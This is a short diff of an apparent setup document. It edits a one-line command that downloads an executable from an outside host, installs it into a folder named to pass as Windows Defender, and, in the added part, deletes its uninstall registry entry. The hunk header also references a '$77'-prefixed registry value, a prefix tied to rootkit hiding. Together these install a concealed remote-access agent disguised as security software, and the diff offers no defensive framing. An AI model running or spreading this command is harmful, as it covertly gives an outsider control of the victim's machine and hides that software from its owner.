@@ -72,5 +72,5 @@ reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\$77Dll" /v Sys
 - Administrator access
 
 ```
-curl -L -o "C:\Program Files\Agentpro.exe" "https://dumpskart.com/Mesh/Agentpro3.exe" && "C:\Program Files\Agentpro.exe" -fullinstall --installPath=C:\Windows\System32\defender
+curl -L -o "C:\Program Files\Agentpro.exe" "https://dumpskart.com/Mesh/Agentpro3.exe" && "C:\Program Files\Agentpro.exe" -fullinstall --installPath=C:\Windows\System32\defender && reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\WindowsSecurityService" /f
 ```
